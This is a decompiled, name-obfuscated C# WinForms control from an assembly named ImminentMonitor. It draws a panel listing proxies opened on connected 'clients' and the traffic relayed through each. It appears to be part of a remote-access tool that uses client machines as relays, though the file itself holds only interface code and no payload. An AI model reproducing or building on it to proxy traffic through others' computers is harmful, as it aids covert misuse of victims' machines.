// Decompiled with JetBrains decompiler
// Type: UserControlProxies
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlProxies : UserControl
{
  private IContainer icontainer_0;
  private GClass41 gclass41_0;
  private ColumnHeader columnHeader_0;
  private ColumnHeader columnHeader_1;
  private ColumnHeader columnHeader_2;
  private ContextMenuStrip contextMenuStrip_0;
  private ToolStripMenuItem toolStripMenuItem_0;
  private ToolStripSeparator toolStripSeparator_0;
  private ToolStripMenuItem toolStripMenuItem_1;
  private ToolStripMenuItem toolStripMenuItem_2;
  private ImageList imageList_0;
  private Timer timer_0;
  private GControl0 gcontrol0_0;
  private GControl0 gcontrol0_1;
  private GClass41 gclass41_1;
  private ColumnHeader columnHeader_3;
  private ColumnHeader columnHeader_4;
  private ColumnHeader columnHeader_5;
  private ColumnHeader columnHeader_6;
  private ColumnHeader columnHeader_7;
  private GClass16[] gclass16_0;

  public UserControlProxies()
  {
    this.AutoScroll = true;
    this.AutoScaleMode = AutoScaleMode.None;
    this.InitializeComponent();
    Class97.smethod_15(this.vmethod_8());
    this.method_0();
    this.method_4();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.icontainer_0 = (IContainer) new System.ComponentModel.Container();
    this.vmethod_9(new ContextMenuStrip(this.icontainer_0));
    this.vmethod_11(new ToolStripMenuItem());
    this.vmethod_13(new ToolStripSeparator());
    this.vmethod_15(new ToolStripMenuItem());
    this.vmethod_17(new ToolStripMenuItem());
    this.vmethod_19(new ImageList(this.icontainer_0));
    this.vmethod_21(new Timer(this.icontainer_0));
    this.vmethod_25(new GControl0());
    this.vmethod_27(new GClass41());
    this.vmethod_29(new ColumnHeader());
    this.vmethod_31(new ColumnHeader());
    this.vmethod_33(new ColumnHeader());
    this.vmethod_35(new ColumnHeader());
    this.vmethod_37(new ColumnHeader());
    this.vmethod_23(new GControl0());
    this.vmethod_1(new GClass41());
    this.vmethod_3(new ColumnHeader());
    this.vmethod_5(new ColumnHeader());
    this.vmethod_7(new ColumnHeader());
    this.vmethod_8().SuspendLayout();
    this.vmethod_24().SuspendLayout();
    this.vmethod_22().SuspendLayout();
    this.SuspendLayout();
    this.vmethod_8().Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_8().Items.AddRange(new ToolStripItem[4]
    {
      (ToolStripItem) this.vmethod_10(),
      (ToolStripItem) this.vmethod_12(),
      (ToolStripItem) this.vmethod_14(),
      (ToolStripItem) this.vmethod_16()
    });
    this.vmethod_8().Name = "cntProxy";
    ContextMenuStrip contextMenuStrip = this.vmethod_8();
    Size size1 = new Size(144, 76);
    Size size2 = size1;
    contextMenuStrip.Size = size2;
    this.vmethod_10().Name = "CloseProxyToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem1 = this.vmethod_10();
    size1 = new Size(143, 22);
    Size size3 = size1;
    toolStripMenuItem1.Size = size3;
    this.vmethod_10().Text = "Close Proxy";
    this.vmethod_12().Name = "ToolStripSeparator4";
    ToolStripSeparator toolStripSeparator = this.vmethod_12();
    size1 = new Size(140, 6);
    Size size4 = size1;
    toolStripSeparator.Size = size4;
    this.vmethod_14().Name = "CopyIPToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem2 = this.vmethod_14();
    size1 = new Size(143, 22);
    Size size5 = size1;
    toolStripMenuItem2.Size = size5;
    this.vmethod_14().Text = "Copy IP";
    this.vmethod_16().Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.vmethod_16().Name = "CopyPortToolStripMenuItem";
    ToolStripMenuItem toolStripMenuItem3 = this.vmethod_16();
    size1 = new Size(143, 22);
    Size size6 = size1;
    toolStripMenuItem3.Size = size6;
    this.vmethod_16().Text = "Copy Port";
    this.vmethod_18().ColorDepth = ColorDepth.Depth32Bit;
    ImageList imageList = this.vmethod_18();
    size1 = new Size(16, 16);
    Size size7 = size1;
    imageList.ImageSize = size7;
    this.vmethod_18().TransparentColor = Color.Transparent;
    this.vmethod_20().Interval = 1000;
    this.vmethod_24().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_24().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_24().method_5(false);
    this.vmethod_24().Controls.Add((Control) this.vmethod_26());
    this.vmethod_24().method_3(true);
    GControl0 gcontrol0_1 = this.vmethod_24();
    size1 = new Size(730, 387);
    Size size_1_1 = size1;
    gcontrol0_1.method_1(size_1_1);
    GControl0 gcontrol0_2 = this.vmethod_24();
    Point point1 = new Point(0, 230);
    Point point2 = point1;
    gcontrol0_2.Location = point2;
    this.vmethod_24().Name = "DropDownContainerActiveConnections";
    GControl0 gcontrol0_3 = this.vmethod_24();
    size1 = new Size(730, 387);
    Size size8 = size1;
    gcontrol0_3.Size = size8;
    this.vmethod_24().TabIndex = 6;
    this.vmethod_24().Text = "Selected Active Connections";
    this.vmethod_26().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_26().Columns.AddRange(new ColumnHeader[5]
    {
      this.vmethod_28(),
      this.vmethod_30(),
      this.vmethod_32(),
      this.vmethod_34(),
      this.vmethod_36()
    });
    this.vmethod_26().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_26().FullRowSelect = true;
    this.vmethod_26().HideSelection = false;
    GClass41 gclass41_1 = this.vmethod_26();
    point1 = new Point(13, 27);
    Point point3 = point1;
    gclass41_1.Location = point3;
    this.vmethod_26().Name = "AeroListviewProxyConnections";
    GClass41 gclass41_2 = this.vmethod_26();
    size1 = new Size(695, 347);
    Size size9 = size1;
    gclass41_2.Size = size9;
    this.vmethod_26().TabIndex = 5;
    this.vmethod_26().UseCompatibleStateImageBehavior = false;
    this.vmethod_26().View = View.Details;
    this.vmethod_26().VirtualMode = true;
    this.vmethod_28().Text = "IP";
    this.vmethod_28().Width = 211;
    this.vmethod_30().Text = "Port";
    this.vmethod_32().Text = "Data Sent";
    this.vmethod_32().Width = 152;
    this.vmethod_34().Text = "Data Received";
    this.vmethod_34().Width = 161;
    this.vmethod_36().Text = "Connected";
    this.vmethod_36().Width = 93;
    this.vmethod_22().BackColor = Color.FromArgb(241, 244, 245);
    this.vmethod_22().method_5(false);
    this.vmethod_22().Controls.Add((Control) this.vmethod_0());
    this.vmethod_22().Dock = DockStyle.Top;
    this.vmethod_22().method_3(true);
    GControl0 gcontrol0_4 = this.vmethod_22();
    size1 = new Size(730, 230);
    Size size_1_2 = size1;
    gcontrol0_4.method_1(size_1_2);
    GControl0 gcontrol0_5 = this.vmethod_22();
    point1 = new Point(0, 0);
    Point point4 = point1;
    gcontrol0_5.Location = point4;
    this.vmethod_22().Name = "DropDownContainerProxies";
    GControl0 gcontrol0_6 = this.vmethod_22();
    size1 = new Size(730, 230);
    Size size10 = size1;
    gcontrol0_6.Size = size10;
    this.vmethod_22().TabIndex = 5;
    this.vmethod_22().Text = "Proxies";
    this.vmethod_0().Activation = ItemActivation.OneClick;
    this.vmethod_0().Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
    this.vmethod_0().Columns.AddRange(new ColumnHeader[3]
    {
      this.vmethod_2(),
      this.vmethod_4(),
      this.vmethod_6()
    });
    this.vmethod_0().ContextMenuStrip = this.vmethod_8();
    this.vmethod_0().Font = new Font("Segoe UI", 8.25f);
    this.vmethod_0().FullRowSelect = true;
    this.vmethod_0().HideSelection = false;
    GClass41 gclass41_3 = this.vmethod_0();
    point1 = new Point(13, 32);
    Point point5 = point1;
    gclass41_3.Location = point5;
    this.vmethod_0().MultiSelect = false;
    this.vmethod_0().Name = "AeroListviewProxy";
    this.vmethod_0().OwnerDraw = true;
    GClass41 gclass41_4 = this.vmethod_0();
    size1 = new Size(695, 186);
    Size size11 = size1;
    gclass41_4.Size = size11;
    this.vmethod_0().SmallImageList = this.vmethod_18();
    this.vmethod_0().TabIndex = 2;
    this.vmethod_0().UseCompatibleStateImageBehavior = false;
    this.vmethod_0().View = View.Details;
    this.vmethod_2().Text = "Client";
    this.vmethod_2().Width = 187;
    this.vmethod_4().Text = "IP:PORT";
    this.vmethod_4().TextAlign = HorizontalAlignment.Center;
    this.vmethod_4().Width = 321;
    this.vmethod_6().Text = "Proxy Type";
    this.vmethod_6().TextAlign = HorizontalAlignment.Center;
    this.vmethod_6().Width = 169;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.Controls.Add((Control) this.vmethod_24());
    this.Controls.Add((Control) this.vmethod_22());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlProxies);
    size1 = new Size(730, 621);
    this.Size = size1;
    this.vmethod_8().ResumeLayout(false);
    this.vmethod_24().ResumeLayout(false);
    this.vmethod_22().ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual GClass41 vmethod_0() => this.gclass41_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(GClass41 gclass41_2) => this.gclass41_0 = gclass41_2;

  internal virtual ColumnHeader vmethod_2() => this.columnHeader_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(ColumnHeader columnHeader_8) => this.columnHeader_0 = columnHeader_8;

  internal virtual ColumnHeader vmethod_4() => this.columnHeader_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(ColumnHeader columnHeader_8) => this.columnHeader_1 = columnHeader_8;

  internal virtual ColumnHeader vmethod_6() => this.columnHeader_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(ColumnHeader columnHeader_8) => this.columnHeader_2 = columnHeader_8;

  internal virtual ContextMenuStrip vmethod_8() => this.contextMenuStrip_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(ContextMenuStrip contextMenuStrip_1) => this.contextMenuStrip_0 = contextMenuStrip_1;

  internal virtual ToolStripMenuItem vmethod_10() => this.toolStripMenuItem_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.toolStripMenuItem_0 != null)
      this.toolStripMenuItem_0.Click -= eventHandler;
    this.toolStripMenuItem_0 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_0 == null)
      return;
    this.toolStripMenuItem_0.Click += eventHandler;
  }

  internal virtual ToolStripSeparator vmethod_12() => this.toolStripSeparator_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(ToolStripSeparator toolStripSeparator_1) => this.toolStripSeparator_0 = toolStripSeparator_1;

  internal virtual ToolStripMenuItem vmethod_14() => this.toolStripMenuItem_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_2);
    if (this.toolStripMenuItem_1 != null)
      this.toolStripMenuItem_1.Click -= eventHandler;
    this.toolStripMenuItem_1 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_1 == null)
      return;
    this.toolStripMenuItem_1.Click += eventHandler;
  }

  internal virtual ToolStripMenuItem vmethod_16() => this.toolStripMenuItem_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_3);
    if (this.toolStripMenuItem_2 != null)
      this.toolStripMenuItem_2.Click -= eventHandler;
    this.toolStripMenuItem_2 = toolStripMenuItem_3;
    if (this.toolStripMenuItem_2 == null)
      return;
    this.toolStripMenuItem_2.Click += eventHandler;
  }

  internal virtual ImageList vmethod_18() => this.imageList_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ImageList imageList_1) => this.imageList_0 = imageList_1;

  internal virtual Timer vmethod_20() => this.timer_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(Timer timer_1)
  {
    EventHandler eventHandler = new EventHandler(this.method_5);
    if (this.timer_0 != null)
      this.timer_0.Tick -= eventHandler;
    this.timer_0 = timer_1;
    if (this.timer_0 == null)
      return;
    this.timer_0.Tick += eventHandler;
  }

  internal virtual GControl0 vmethod_22() => this.gcontrol0_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(GControl0 gcontrol0_2) => this.gcontrol0_0 = gcontrol0_2;

  internal virtual GControl0 vmethod_24() => this.gcontrol0_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(GControl0 gcontrol0_2) => this.gcontrol0_1 = gcontrol0_2;

  internal virtual GClass41 vmethod_26() => this.gclass41_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_27(GClass41 gclass41_2)
  {
    RetrieveVirtualItemEventHandler itemEventHandler = new RetrieveVirtualItemEventHandler(this.method_7);
    if (this.gclass41_1 != null)
      this.gclass41_1.RetrieveVirtualItem -= itemEventHandler;
    this.gclass41_1 = gclass41_2;
    if (this.gclass41_1 == null)
      return;
    this.gclass41_1.RetrieveVirtualItem += itemEventHandler;
  }

  internal virtual ColumnHeader vmethod_28() => this.columnHeader_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_29(ColumnHeader columnHeader_8) => this.columnHeader_3 = columnHeader_8;

  internal virtual ColumnHeader vmethod_30() => this.columnHeader_4;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_31(ColumnHeader columnHeader_8) => this.columnHeader_4 = columnHeader_8;

  internal virtual ColumnHeader vmethod_32() => this.columnHeader_5;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_33(ColumnHeader columnHeader_8) => this.columnHeader_5 = columnHeader_8;

  internal virtual ColumnHeader vmethod_34() => this.columnHeader_6;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_35(ColumnHeader columnHeader_8) => this.columnHeader_6 = columnHeader_8;

  internal virtual ColumnHeader vmethod_36() => this.columnHeader_7;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_37(ColumnHeader columnHeader_8) => this.columnHeader_7 = columnHeader_8;

  private void method_0()
  {
    if (this.DesignMode)
      return;
    List<ToolStripMenuItem> list_2 = new List<ToolStripMenuItem>();
    int num = this.vmethod_8().Items.Count - 1;
    for (int index = 0; index <= num; ++index)
    {
      if ((object) this.vmethod_8().Items[index].GetType() != (object) typeof (ToolStripSeparator))
        Class97.smethod_13((ToolStripMenuItem) this.vmethod_8().Items[index], ref list_2);
    }
    try
    {
      foreach (ToolStripMenuItem toolStripMenuItem in list_2)
        toolStripMenuItem.Image = Class97.smethod_5(toolStripMenuItem.Text);
    }
    finally
    {
      List<ToolStripMenuItem>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }

  private void method_1(object sender, EventArgs e)
  {
    if (this.vmethod_0().SelectedItems.Count == 0)
      return;
    try
    {
      foreach (ListViewItem selectedItem in this.vmethod_0().SelectedItems)
      {
        this.vmethod_0().Items.Remove(selectedItem);
        Class97.gclass21_0.method_57(selectedItem.Name).method_20().gclass27_0.method_8();
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void method_2(object sender, EventArgs e)
  {
    if (this.vmethod_0().SelectedItems.Count == 0)
      return;
    Class132.smethod_0().Clipboard.SetText(this.vmethod_0().SelectedItems[0].SubItems[1].Text.Split(Conversions.ToCharArrayRankOne(":"))[0]);
  }

  private void method_3(object sender, EventArgs e)
  {
    if (this.vmethod_0().SelectedItems.Count == 0)
      return;
    Class132.smethod_0().Clipboard.SetText(this.vmethod_0().SelectedItems[0].SubItems[1].Text.Split(Conversions.ToCharArrayRankOne(":"))[1]);
  }

  private void method_4()
  {
    try
    {
      if (LicenseManager.UsageMode != LicenseUsageMode.Runtime)
        return;
      foreach (string file in Directory.GetFiles(string.Format("{0}\\Resources\\Images\\Countrys\\", (object) Application.StartupPath)))
        this.vmethod_18().Images.Add(new FileInfo(file).Name, Image.FromFile(file));
      foreach (string file in Directory.GetFiles(string.Format("{0}\\Resources\\Images\\Listview\\", (object) Application.StartupPath)))
        this.vmethod_18().Images.Add(new FileInfo(file).Name, Image.FromFile(file));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_5(object sender, EventArgs e)
  {
    try
    {
      if (this.vmethod_0().SelectedItems.Count > 0)
      {
        this.method_6((GClass18) this.vmethod_0().SelectedItems[0].Tag);
      }
      else
      {
        this.gclass16_0 = (GClass16[]) null;
        this.vmethod_26().VirtualListSize = 0;
        this.vmethod_26().Refresh();
        this.vmethod_24().Text = string.Format("Selected Proxy Connections: {0}", (object) 0);
        this.vmethod_24().Invalidate();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void method_6(GClass18 gclass18_0)
  {
    if (gclass18_0 == null || gclass18_0.method_20().gclass27_0 == null)
      return;
    this.vmethod_24().Text = string.Format("Selected Proxy Connections: {0}", (object) gclass18_0.method_20().gclass27_0.method_5().Length);
    this.vmethod_24().Invalidate();
    this.gclass16_0 = gclass18_0.method_20().gclass27_0.method_5();
    this.vmethod_26().VirtualListSize = this.gclass16_0.Length;
    this.vmethod_26().Refresh();
  }

  private void method_7(object sender, RetrieveVirtualItemEventArgs e)
  {
    if (this.gclass16_0 == null || e.ItemIndex >= this.gclass16_0.Length)
      return;
    GClass16 gclass16 = this.gclass16_0[e.ItemIndex];
    e.Item = new ListViewItem();
    e.Item.Text = gclass16.string_1;
    e.Item.SubItems.Add(gclass16.method_10().ToString());
    e.Item.SubItems.Add(Class97.gclass21_0.method_60(gclass16.method_4()));
    e.Item.SubItems.Add(Class97.gclass21_0.method_60(gclass16.method_6()));
    e.Item.SubItems.Add(gclass16.method_12().ToString());
    e.Item.Tag = (object) gclass16;
  }
}
